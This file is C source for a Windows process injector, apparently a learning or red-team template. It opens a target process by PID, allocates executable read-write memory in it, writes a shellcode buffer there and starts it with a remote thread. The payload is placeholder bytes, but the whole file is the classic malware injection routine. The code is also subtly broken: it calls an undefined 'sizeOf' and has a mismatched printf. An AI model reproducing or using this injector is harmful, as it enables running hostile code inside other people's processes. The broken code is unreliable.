#include <windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";


unsigned long PID, TID= NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

unsigned char shellcode[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41";



int main(int argc, char* argv[]){
	if (argc < 2){
		printf("%s usage: program.exe <PID>", e);
		return 1;
	}

	PID = atoi(argv[1]);
	printf("%s trying to open a handle to process (%ld)\n", i, PID);

	//open a handle to the process 
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL){
		printf("%s couldn't  get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
		return 1;
	}

	printf("%s got a handle to the process!\n\\---0x%p\n", k, hProcess);

	//allocate bytes to process memory
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeOf(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); //PAGE_EXECUTE_READWRITE can be just replaced with 0x40
	//maybe use VirtualProtect() to change the permissions of the memory
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeOf(shellcode));


	WriteProcessMemory(hProcess, rBuffer, shellcode, sizeOf(shellcode), NULL);
	printf("%s allocated %zu-bytes to process memory\n", k, sizeOf(shellcode));


	//create thread for running the payload
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (hThread == NULL){
		printf("%s failed to get a handle to the thread, error: %ld", e, PID, GetLastError());
		CloseHandle(hProcess);
		return 1;
	}


	printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", k, TID, hThread);

	//if something doesn't work just delete this. 
	printf("%s waiting for thread to finish\n", k);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing\n", k);

	printf("%s cleaning up\n", i);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s finished!\n", i);


	return 0;
}